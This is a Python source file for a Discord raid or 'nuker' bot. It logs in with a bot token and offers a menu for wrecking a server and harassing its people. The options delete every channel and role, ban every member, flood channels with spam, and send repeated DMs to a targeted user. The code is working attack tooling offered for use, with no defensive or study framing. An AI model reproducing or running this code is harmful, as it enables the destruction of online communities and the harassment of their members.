import discord
import asyncio
import logging
import os
import webbrowser
import httpx
from discord.ext import commands
from colorama import Fore, Style, init
import re
import shutil

RED_GRADIENT = [
    Fore.LIGHTRED_EX,  
    Fore.RED,          
    Fore.LIGHTRED_EX,
    Fore.RED,
    Fore.LIGHTRED_EX
]


BLUE_GRADIENT = [
    Fore.LIGHTBLUE_EX, 
    Fore.BLUE,         
    Fore.LIGHTBLUE_EX,
    Fore.BLUE,
    Fore.LIGHTBLUE_EX
]

RESET = Style.RESET_ALL


TERMINAL_WIDTH = 80


logging.basicConfig(level=logging.CRITICAL)
logging.getLogger("discord").setLevel(logging.CRITICAL)

def gradient_text(text, gradient, diagonal=False):
    colored_text = ""
    gradient_length = len(gradient)
    
    for i, char in enumerate(text):
        if diagonal:
            colored_text += gradient[(i) % gradient_length] + char
        else:
            colored_text += gradient[i % gradient_length] + char
    
    return colored_text + RESET


def print_centered(text, width=TERMINAL_WIDTH):
    lines = text.split("\n")
    centered_lines = "\n".join([line.center(width) for line in lines])
    print(centered_lines)


def print_with_rainbow_border(text, gradient, diagonal=False):
    border = gradient_text("=" * 50, gradient, diagonal)
    print(border.center(TERMINAL_WIDTH))
    print_centered(gradient_text(f"= {text} =", gradient, diagonal), TERMINAL_WIDTH)
    print(border.center(TERMINAL_WIDTH))

def clear_console():
    os.system("cls" if os.name == "nt" else "clear")

def generate_invite_url(client_id, permissions_integer):
    return f"https://discord.com/oauth2/authorize?client_id={client_id}&permissions={permissions_integer}&scope=bot"

def validate_input(prompt, validation_func=None):
    while True:
        user_input = input(prompt).strip()
        if validation_func and not validation_func(user_input):
            print(Fore.RED + "Invalid input. Try again." + Style.RESET_ALL)
        else:
            return user_input


title = r"""

      __   __               ________  ________  ________   
     /\ \ /\ \             /\_____  \/\_____  \/\_____  \  
     \ `\`\/'/'            \/___//'/'\/___//'/'\/___//'/'  
      `\/ > <      _______     /' /'     /' /'     /' /'   
          \/'/\`\  /\______\  /' /'     /' /'     /' /'    
          /\_\\ \_\\/______/ /\_/      /\_/      /\_/      
          \/_/ \/_/          \//       \//       \//       
                                                         
                                                         

"""
title_gradient = gradient_text(title, BLUE_GRADIENT)

menu = """
╔══════════════════════════════════════════════════════════════════════════════════════════╗
    (1) < Guild Raid        ║   (3) < Channel Delete     ║   (5) < DM Spam                
    (2) < All Members Ban   ║   (4) < Delete All Roles   ║   (6) < Role Plus              
    (7) < Create Channels   ║   (8) < All Channel spam   ║   (9) < Channel spam           
╚══════════════════════════════════════════════════════════════════════════════════════════╝
"""
menu_gradient = gradient_text(menu, BLUE_GRADIENT)


intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
intents.messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

token = ""
client_id = ""
is_bot_ready = False 

@bot.event
async def on_ready():
    global is_bot_ready
    is_bot_ready = True
    print_centered(gradient_text("Bot is ready!", BLUE_GRADIENT))
    await perform_task()

@bot.event
async def on_guild_join(guild):
    print_centered(gradient_text(f"Bot has joined the guild: {guild.name}", BLUE_GRADIENT))

async def check_bot_in_guild(guild_id_check):
    try:
        guild = bot.get_guild(int(guild_id_check))
        if guild and guild.get_member(bot.user.id):
            return True
    except Exception as e:
        pass 
    return False

async def perform_task():
    try:
        if task_selection == "1":
            await server_spammer()
        elif task_selection == "2":
            await ban_all_members()
        elif task_selection == "3":
            await delete_all_channels()
        elif task_selection == "4":
            await delete_all_roles()
        elif task_selection == "5":
            await members_spammer()
        elif task_selection == "6":
            await role_plus()
        elif task_selection == "7":
            await create_channels_fast()
        elif task_selection == "8":
            await spam_all_channels_fast()
        elif task_selection == "9":
            await spam_target_channel()
        else:
            print_centered("\033[91mInvalid task selection\033[0m")
    except Exception as e:
        logging.error(f"An error occurred in perform_task: {e}")
        print_centered(f"\033[91mAn error occurred: {e}\033[0m")
    
    print(Fore.YELLOW + "\nTask Completed. Returning to menu..." + Style.RESET_ALL)
    await asyncio.sleep(2)

init(autoreset=True)

async def send_message(channel, message):
    try:
        await channel.send(message)
        print(Fore.GREEN + f"Message sent successfully in channel {channel.id}." + Style.RESET_ALL)
    except discord.Forbidden:
        logging.error(f"Missing permissions to send a message in the channel: {channel.id}")
        print(Fore.RED + f"[ERROR] Missing permissions to send a message in the channel: {channel.id}" + Style.RESET_ALL)
    except discord.HTTPException as e:
        if e.status == 429:  
            retry_after = int(e.response.headers.get("Retry-After", 1))
            logging.warning(f"Rate limited. Retrying after {retry_after} seconds.")
            await asyncio.sleep(retry_after)
            await send_message(channel, message) 
        else:
            logging.error(f"Failed to send message in channel {channel.id}: {e}")
            print(Fore.RED + f"[ERROR] Failed to send message in channel {channel.id}: {e}" + Style.RESET_ALL)

async def ensure_send_messages(channel, message, target_count):
    send_tasks = [send_message(channel, message) for _ in range(target_count)]
    await asyncio.gather(*send_tasks, return_exceptions=True)

async def create_and_spam(channel_name, message, message_count):
    try:
        channel = await guild.create_text_channel(channel_name)
        print(Fore.GREEN + f"The channel was created successfully! (ID: {channel.id})" + Style.RESET_ALL)
        await ensure_send_messages(channel, message, message_count)
    except Exception as e:
        logging.error(f"Error in create_and_spam: {e}")

async def server_spammer():
    global guild, message, user_message_count

    guild_id = int(guild_id_str)
    message = user_message
    new_channel_name = user_channel_name
    channel_count = int(user_channel_count)
    message_count = int(user_message_count)
    guild = bot.get_guild(guild_id)

    if guild:
        delete_tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_tasks, return_exceptions=True)

        create_spam_tasks = [create_and_spam(new_channel_name, message, message_count) for _ in range(channel_count)]
        await asyncio.gather(*create_spam_tasks)
    else:
        print(Fore.RED + "Guild not found!" + Style.RESET_ALL)

async def ban_member(member):
    try:
        await member.ban(reason="Banned by bot")
        print(Fore.GREEN + f"Member {member.name} banned successfully." + Style.RESET_ALL)
    except discord.Forbidden:
        logging.error(f"Missing permissions to ban the member: {member.name}")
        print(Fore.RED + f"[ERROR] Missing permissions to ban the member: {member.name}" + Style.RESET_ALL)
    except discord.HTTPException as e:
        logging.error(f"Failed to ban member {member.name}: {e}")
        print(Fore.RED + f"[ERROR] Failed to ban member {member.name}: {e}" + Style.RESET_ALL)
        if e.status == 429:  
            retry_after = int(e.response.headers.get("Retry-After", 10))
            logging.warning(f"Rate limited. Retrying after {retry_after} seconds.")
            await asyncio.sleep(retry_after)
            await ban_member(member)  

async def ban_all_members():
    guild_id = int(guild_id_str)
    guild = bot.get_guild(guild_id)
    if guild:
        members = guild.members
        ban_tasks = [ban_member(member) for member in members]
        for i in range(0, len(ban_tasks), 5):  
            await asyncio.gather(*ban_tasks[i:i + 5])
            await asyncio.sleep(0)  
    else:
        logging.error(f"Guild ID {guild_id} not found.")
        print(Fore.RED + f"[ERROR] Guild ID {guild_id} not found." + Style.RESET_ALL)

async def delete_channel_fast(channel):
    try:
        await channel.delete()
        print(Fore.GREEN + f"[SUCCESS] Deleted channel: {channel.name}" + Style.RESET_ALL)
    except discord.Forbidden:
        print(Fore.RED + f"[ERROR] No permission to delete: {channel.name}" + Style.RESET_ALL)
    except discord.NotFound:
        pass 
    except discord.HTTPException as e:
        if e.status == 429:
            print(Fore.YELLOW + f"[RATELIMIT] Too fast on channel {channel.name}, skipping..." + Style.RESET_ALL)
        else:
            print(Fore.RED + f"[ERROR] Failed to delete channel {channel.name}: {e}" + Style.RESET_ALL)

async def delete_all_channels():
    guild_id = int(guild_id_str)
    guild = bot.get_guild(guild_id)
    
    if guild:
        print(Fore.CYAN + "Starting mass channel deletion..." + Style.RESET_ALL)
        
        channels = guild.channels
        batch_size = 10
        tasks = []

        for channel in channels:
            tasks.append(asyncio.create_task(delete_channel_fast(channel)))
            
            if len(tasks) >= batch_size:
                await asyncio.gather(*tasks)
                tasks = []
                
                

        if tasks:
            await asyncio.gather(*tasks)
            
        print(Fore.GREEN + "All channels have been nuked." + Style.RESET_ALL)
    else:
        logging.error(f"Guild ID {guild_id} not found.")
        print(Fore.RED + f"[ERROR] Guild ID {guild_id} not found." + Style.RESET_ALL)

async def send_dm_fast(user, message):
    try:
        await user.send(message)
        print(Fore.GREEN + f"[SUCCESS] DM sent to {user.name}" + Style.RESET_ALL)
    except discord.Forbidden:
        print(Fore.RED + f"[ERROR] Cannot DM {user.name} (Closed DMs?)" + Style.RESET_ALL)
    except discord.HTTPException as e:
        if e.status == 429:
            print(Fore.YELLOW + f"[RATELIMIT] Too fast! Skipping..." + Style.RESET_ALL)
        else:
            print(Fore.RED + f"[ERROR] Failed to send DM: {e}" + Style.RESET_ALL)

async def members_spammer():
    guild_id = int(guild_id_str)
    member_id = int(member_id_str)
    message = user_message
    times = int(user_message_count)
    
    guild = bot.get_guild(guild_id)
    user = None
    
    if guild:
        user = guild.get_member(member_id)
    
    if not user:
        try:
            print(Fore.YELLOW + "Member not found in cache, fetching from API..." + Style.RESET_ALL)
            user = await bot.fetch_user(member_id)
        except Exception as e:
            print(Fore.RED + f"[ERROR] Could not find user with ID {member_id}: {e}" + Style.RESET_ALL)
            return

    if user:
        print(Fore.CYAN + f"Starting DM Spam to {user.name} ({times} times)..." + Style.RESET_ALL)
        
        batch_size = 10 
        tasks = []
        
        for i in range(times):
            tasks.append(asyncio.create_task(send_dm_fast(user, message)))
            
            if len(tasks) >= batch_size:
                await asyncio.gather(*tasks)
                tasks = []
                await asyncio.sleep(0.1) 

        if tasks:
            await asyncio.gather(*tasks)
            
        print(Fore.GREEN + "DM Spam task finished." + Style.RESET_ALL)
    else:
        print(Fore.RED + f"[ERROR] User object is None." + Style.RESET_ALL)

async def create_role(guild, role_name):
    try:
        role = await guild.create_role(name=role_name)
        print(Fore.GREEN + f"Role '{role.name}' created successfully." + Style.RESET_ALL)
    except discord.Forbidden:
        logging.error(f"Missing permissions to create the role: {role_name}")
        print(Fore.RED + f"[ERROR] Missing permissions to create the role: {role_name}" + Style.RESET_ALL)
    except discord.HTTPException as e:
        if e.status == 429:  
            retry_after = int(e.response.headers.get("Retry-After", 10))
            logging.warning(f"Rate limited. Retrying after {retry_after} seconds.")
            await asyncio.sleep(retry_after)
            await create_role(guild, role_name)  
        else:
            logging.error(f"Failed to create role: {e}")
            print(Fore.RED + f"[ERROR] Failed to create role: {e}" + Style.RESET_ALL)

async def role_plus():
    guild_id = int(guild_id_str)
    role_name = user_role_name
    times = int(user_role_count)
    guild = bot.get_guild(guild_id)
    if guild:
        create_tasks = [create_role(guild, role_name) for _ in range(times)]
        await asyncio.gather(*create_tasks)
    else:
        logging.error(f"Guild ID {guild_id} not found.")
        print(Fore.RED + f"[ERROR] Guild ID {guild_id} not found." + Style.RESET_ALL)

async def delete_role_fast(role):
    try:
        await role.delete()
        print(Fore.GREEN + f"[SUCCESS] Deleted role: {role.name}" + Style.RESET_ALL)
    except discord.Forbidden:
        
        pass 
    except discord.NotFound:
        
        pass
    except discord.HTTPException as e:
        if e.status == 429:
            
            print(Fore.YELLOW + f"[RATELIMIT] Too fast on role {role.name}, skipping..." + Style.RESET_ALL)
        else:
            
            print(Fore.RED + f"[ERROR] Failed to delete role {role.name}: {e}" + Style.RESET_ALL)

async def delete_all_roles():
    guild_id = int(guild_id_str)
    guild = bot.get_guild(guild_id)
    
    if guild:
        print(Fore.CYAN + "Starting mass role deletion..." + Style.RESET_ALL)
        
        
        roles = [role for role in guild.roles if role.name != "@everyone"]
        
        batch_size = 10
        tasks = []
        
        for role in roles:
            tasks.append(asyncio.create_task(delete_role_fast(role)))
            
            if len(tasks) >= batch_size:
                await asyncio.gather(*tasks)
                tasks = []
                
                await asyncio.sleep(0.05)
        
        if tasks:
            await asyncio.gather(*tasks)
            
        print(Fore.GREEN + "Mass role deletion command finished." + Style.RESET_ALL)
    else:
        logging.error(f"Guild ID {guild_id} not found.")
        print(Fore.RED + f"[ERROR] Guild ID {guild_id} not found." + Style.RESET_ALL)

async def create_channels_fast():
    global guild, user_channel_name, user_channel_count

    guild_id = int(guild_id_str)
    guild = bot.get_guild(guild_id)
    name = user_channel_name
    count = int(user_channel_count)

    if guild:
        print(Fore.CYAN + f"Creating {count} channels named '{name}' at FUCKING MAX SPEED..." + Style.RESET_ALL)
        
        async def _create(g, n):
            try:
                
                c = await g.create_text_channel(n)
                print(Fore.GREEN + f"[+] Created: {c.name} ({c.id})" + Style.RESET_ALL)
            except discord.HTTPException as e:
                
                if e.status == 429:
                    print(Fore.YELLOW + "[!] Rate Limited (429) - Discord is crying." + Style.RESET_ALL)
                else:
                    pass

        
        tasks = [_create(guild, name) for _ in range(count)]
        
        
        await asyncio.gather(*tasks, return_exceptions=True)
            
        print(Fore.GREEN + "Fast Channel Creation Finished." + Style.RESET_ALL)
    else:
        print(Fore.RED + "Guild not found!" + Style.RESET_ALL)

async def spam_all_channels_fast():
    global guild, user_message, user_message_count

    guild_id = int(guild_id_str)
    guild = bot.get_guild(guild_id)
    message = user_message
    times = int(user_message_count)

    if guild:
        print(Fore.CYAN + "Nuking ALL channels with messages at LIGHT SPEED..." + Style.RESET_ALL)
        
        
        text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
        
        if not text_channels:
            print(Fore.RED + "No text channels found!" + Style.RESET_ALL)
            return

        async def _spam(chan, msg):
            try:
                await chan.send(msg)
                print(Fore.GREEN + f"[>] Sent to {chan.name}" + Style.RESET_ALL)
            except discord.Forbidden:
                pass 
            except discord.HTTPException:
                pass 

    
        
        tasks = []
        for channel in text_channels:
            for _ in range(times):
                tasks.append(_spam(channel, message))
        
        print(Fore.MAGENTA + f"Queued {len(tasks)} messages. Firing now..." + Style.RESET_ALL)
        
        
        await asyncio.gather(*tasks, return_exceptions=True)
            
        print(Fore.GREEN + "Mass Spam Task Finished." + Style.RESET_ALL)
    else:
        print(Fore.RED + "Guild not found!" + Style.RESET_ALL)

async def spam_target_channel():
    global guild, user_message, user_message_count, channel_id_str, token

    channel_id = channel_id_str
    message = user_message
    times = int(user_message_count)
    
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }
    json_payload = {"content": message}

    print(Fore.CYAN + f"INITIATING SMART-BURST ATTACK ON {channel_id}..." + Style.RESET_ALL)

    async with httpx.AsyncClient() as client:
        async def _smart_send(i):
            try:
                response = await client.post(url, headers=headers, json=json_payload)
                if response.status_code in [200, 201]:
                    print(Fore.GREEN + f"[+] Message {i+1} Landed" + Style.RESET_ALL)
                elif response.status_code == 429:
                    
                    
                    retry_after = response.json().get('retry_after', 0)
                    print(Fore.YELLOW + f"[!] Rate Limit Hit (Waiting {retry_after}s)" + Style.RESET_ALL)
                else:
                    print(Fore.RED + f"[!] Error: {response.status_code}" + Style.RESET_ALL)
            except Exception as e:
                pass 

        tasks = []
        for i in range(times):
            
            
            tasks.append(asyncio.create_task(_smart_send(i)))
            
            
            
            
            await asyncio.sleep(0.05) 

        
        await asyncio.gather(*tasks, return_exceptions=True)

    print(Fore.GREEN + "Attack Cycle Complete." + Style.RESET_ALL)
        
async def main_async():
    global token, client_id, guild_id_str, user_message, user_channel_name, user_channel_count, user_message_count, task_selection, channel_id_str, member_id_str, user_role_name, user_role_count
    global permissions_integer

    permissions_integer = 1759218604441591
    
    clear_console()
    print_centered(title_gradient)
    
    print(Fore.CYAN + "Enter Bot Credentials Once:" + Style.RESET_ALL)
    token = validate_input("Token: ", lambda t: len(t) > 20)
    client_id = validate_input("Client ID: ", lambda cid: cid.isdigit())

    try:
        print(Fore.YELLOW + "Logging in..." + Style.RESET_ALL)
        await bot.login(token)
        asyncio.create_task(bot.connect())
        
        print(Fore.YELLOW + "Waiting for connection..." + Style.RESET_ALL)
        await bot.wait_until_ready()
        
    except Exception as e:
        logging.error(f"Failed to login: {e}")
        print_centered(f"\033[91mFailed to login: {e}\033[0m")
        return

    while True:
        clear_console()
        print_centered(title_gradient)
        print_centered(menu_gradient)
        print_centered(Fore.GREEN + f"Logged in as: {bot.user} | ID: {bot.user.id}" + Style.RESET_ALL)
        
        task_selection = validate_input("Choose: ", lambda t: t in ["1", "2", "3", "4", "5", "6", "7", "8", "9"])
        
        guild_id_str = validate_input("Server ID: ", lambda gid: gid.isdigit())

        if not await check_bot_in_guild(guild_id_str):
            print(Fore.YELLOW + "Bot is not in this guild. Generating invite..." + Style.RESET_ALL)
            invite_url = generate_invite_url(client_id, permissions_integer)
            print_with_rainbow_border("Invite URL", BLUE_GRADIENT)
            print(f"Invite URL: {invite_url}".center(TERMINAL_WIDTH))
            print("Opening browser...".center(TERMINAL_WIDTH))
            webbrowser.open(invite_url)
            input("Press Enter after authorizing the bot..." + RESET)
            await asyncio.sleep(2)

        if task_selection == "1":
            user_message = validate_input("Message: ")
            user_channel_name = validate_input("Channel name: ")
            user_channel_count = validate_input("Number of channels to add: ", lambda n: n.isdigit())
            user_message_count = validate_input("Times: ", lambda n: n.isdigit())
        elif task_selection == "3":
            pass
        elif task_selection == "5":
            member_id_str = validate_input("Member ID: ", lambda mid: mid.isdigit())
            user_message = validate_input("Message: ")
            user_message_count = validate_input("Times: ", lambda n: n.isdigit())
        elif task_selection == "6":
            user_role_name = validate_input("Role name: ")
            user_role_count = validate_input("Times: ", lambda n: n.isdigit())
        elif task_selection == "7":
            user_channel_name = validate_input("Channel Name: ")
            user_channel_count = validate_input("How many (Fuck ton?): ", lambda n: n.isdigit())
        elif task_selection == "8":
            user_message = validate_input("Spam Message: ")
            user_message_count = validate_input("Messages per channel: ", lambda n: n.isdigit())
        elif task_selection == "9":
            channel_id_str = validate_input("Target Channel ID: ", lambda cid: cid.isdigit())
            user_message = validate_input("Spam Message: ")
            user_message_count = validate_input("How many times: ", lambda n: n.isdigit())

        print(Fore.CYAN + "Executing task..." + Style.RESET_ALL)
        await perform_task()
        
        input(Fore.YELLOW + "\nPress Enter to return to menu..." + Style.RESET_ALL)

def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\nExiting...")

if __name__ == "__main__":
    main()